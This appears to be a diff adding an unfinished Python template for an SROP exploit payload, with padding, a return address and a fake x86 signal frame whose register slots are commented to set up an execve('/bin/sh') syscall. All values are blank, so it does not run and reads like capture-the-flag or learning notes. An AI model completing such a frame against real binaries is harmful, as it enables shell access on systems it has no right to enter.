@@ -1,0 +1,25 @@
+payload = ""
+payload += "A"*?    	# dummy
+payload += # RET
+payload += # GS (dummy)
+payload += # FS (dummy)
+payload += # ES (dummy)
+payload += # DS (dummy)
+payload += # EDI (dummy)
+payload += # ESI (dummy)
+payload += # EBP (dummy)
+payload += # ESP (dummy)
+payload += # EBX # /bin/sh
+payload += # EDX
+payload += # ECX
+payload += # EAX # execve system call number
+payload += # trapno (dummy)
+payload += # err (dummy)
+payload += # EIP #syscall
+payload += # CS
+payload += # eflags (dummy)
+payload += # esp_at_signal (dummy)
+payload += # SS
+
+
+
